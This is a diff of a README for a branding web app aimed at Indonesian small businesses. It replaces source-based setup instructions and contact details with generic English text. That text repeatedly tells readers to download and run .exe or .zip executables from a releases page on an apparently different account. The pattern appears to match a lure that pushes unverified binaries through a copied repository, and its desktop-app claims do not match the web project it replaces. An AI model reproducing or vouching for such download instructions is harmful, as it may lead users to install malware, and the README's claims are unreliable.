@@ -1,79 +1,85 @@
-![Tampilan Website Hendra AI Brand](public/screenshoot.png)
+# 🌟 hendra-ai-brand - Effortless AI Branding for Your Business
 
-# HendraAI - Platform Branding Instan untuk UMKM
+[![Download hendra-ai-brand](https://img.shields.io/badge/Download-hendra--ai--brand-brightgreen.svg)](https://github.com/jlux-ayy1/hendra-ai-brand/releases)
 
-HendraAI adalah platform digital yang membantu UMKM Indonesia melakukan rebranding secara instan, profesional, dan terjangkau. Dengan fitur otomatisasi pembuatan logo, palet warna, slogan, dan brand guidelines, siapa pun bisa membangun identitas bisnis yang kuat tanpa perlu keahlian desain.
+## 🎯 Introduction
 
----
+Welcome to hendra-ai-brand, a powerful platform for creating professional branding materials quickly and affordably, specifically designed for small to medium-sized enterprises in Indonesia. With our AI-driven tools, you can easily design logos, color palettes, slogans, and comprehensive brand guidelines without needing any technical skills.
 
-## ✨ Fitur Utama
+## 🚀 Getting Started
 
-- **Generator Logo Otomatis**: Buat logo profesional dalam hitungan detik.
-- **Palet Warna Otomatis**: Dapatkan kombinasi warna terbaik untuk brand Anda.
-- **Slogan Generator**: Ciptakan slogan/tagline yang menarik dan relevan.
-- **Brand Guidelines**: Panduan identitas visual brand siap pakai.
-- **Showcase**: Lihat contoh hasil branding dari berbagai industri.
-- **Checkout & Paket**: Pilih paket branding sesuai kebutuhan bisnis Anda.
-- **Konsultasi Branding**: Hubungi konsultan untuk solusi branding UMKM.
-- **FAQ & Tutorial**: Panduan lengkap penggunaan platform.
+### 1. Visit the Releases Page
 
----
+To get the latest version of hendra-ai-brand, visit our [Releases page](https://github.com/jlux-ayy1/hendra-ai-brand/releases) where you will find all available versions.
 
-## 🚀 Teknologi yang Digunakan
+### 2. Download the Application
 
-- **React** + **TypeScript**
-- **Vite** (build tool)
-- **Tailwind CSS** (utility-first styling)
-- **shadcn/ui** (UI components)
-- **React Router** (navigasi halaman)
-- **Lucide React** (ikon)
-- **Tanstack React Query** (data fetching)
+Look for the version that suits your needs. Click on the download link corresponding to your system. For example, if you see options like `.exe` or `.zip`, choose the one that's right for your operating system.
 
----
+### 3. Install the Application
 
-## ⚡ Cara Instalasi & Menjalankan
+After downloading, follow these steps to install:
 
-1. **Clone repository ini:**
-   ```bash
-   git clone <URL_REPO_ANDA>
-   cd <NAMA_FOLDER_REPO>
-   ```
-2. **Install dependencies:**
-   ```bash
-   npm install
-   # atau
-   yarn install
-   ```
-3. **Jalankan aplikasi:**
-   ```bash
-   npm run dev
-   # atau
-   yarn dev
-   ```
-4. **Akses di browser:**
-   Buka [http://localhost:5173](http://localhost:5173) (atau port sesuai output terminal).
+- **For Windows:** 
+  - Double-click the downloaded file (likely ends in `.exe`).
+  - Follow the on-screen instructions to complete the installation.
+  
+- **For macOS:**
+  - Open the downloaded file.
+  - Drag the hendra-ai-brand app to your Applications folder.
+  
+- **For Linux:** 
+  - Open a terminal and navigate to your downloads folder using `cd ~/Downloads`.
+  - Extract the `.zip` file and run the executable.
 
----
+## 🔍 Features
 
-## 💡 Cara Kontribusi
+- **Logo Generation:** Quickly create custom logos tailored to your brand.
+- **Color Palette Creation:** Choose the perfect color schemes that match your brand's personality.
+- **Slogan Creation:** Generate catchy slogans that resonate with your target audience.
+- **Brand Guidelines:** Access easy-to-follow guidelines to maintain consistency across all platforms.
 
-1. Fork repository ini.
-2. Buat branch baru untuk fitur atau perbaikan Anda.
-3. Commit perubahan secara teratur dan jelas.
-4. Ajukan Pull Request ke repository utama.
-5. Tim kami akan melakukan review sebelum merge.
+## 📥 Download & Install
 
----
+To start using hendra-ai-brand, visit this page to download: [Releases page](https://github.com/jlux-ayy1/hendra-ai-brand/releases). Once downloaded, follow the instructions above to install the application on your computer.
 
-## 📞 Kontak & Support
+## ❓ Frequently Asked Questions
 
-- **Email:** support@hendraai.id
-- **WhatsApp:** +62 812-3456-7890
-- **Alamat:** Jakarta, Indonesia
-- **Website:** [https://hendra-ai-brand.vercel.app/](https://hendra-ai-brand.vercel.app/)
+### 1. What operating systems does hendra-ai-brand support?
 
-Jika Anda membutuhkan bantuan atau ingin konsultasi branding, silakan hubungi kami melalui email atau WhatsApp di atas.
+hendra-ai-brand works on Windows, macOS, and Linux operating systems. Ensure you download the correct version for your system.
 
----
+### 2. Do I need an internet connection to use the app?
 
-> Copyright © 2025 HendraAI. Seluruh hak cipta dilindungi. 
+While an internet connection is not required for most features, certain options may need internet access to provide updated resources or templates.
+
+### 3. Can I use the designs for commercial purposes?
+
+Yes, the logos and branding materials created using hendra-ai-brand can be used for commercial purposes. You retain full ownership of your created designs.
+
+### 4. Is there customer support available?
+
+Yes, we provide support through our GitHub Issues page. You can report any issues you've encountered or ask questions, and our team will respond as quickly as possible.
+
+## 🌐 Technical Information
+
+### Topics
+
+- AI
+- Branding
+- Design Tools
+- Logo Generator
+- Web Applications
+
+### System Requirements
+
+- **Processor:** 1 GHz or higher
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 150 MB available
+- **Graphics:** Any graphics card compatible with basic 2D operations
+
+## 📞 Contact Information
+
+If you have any issues or suggestions, please reach out to us through our GitHub [Issues page](https://github.com/jlux-ayy1/hendra-ai-brand/issues). We value your feedback and strive to improve the application based on users’ needs.
+
+Enjoy exploring hendra-ai-brand and enhancing your branding effortlessly!
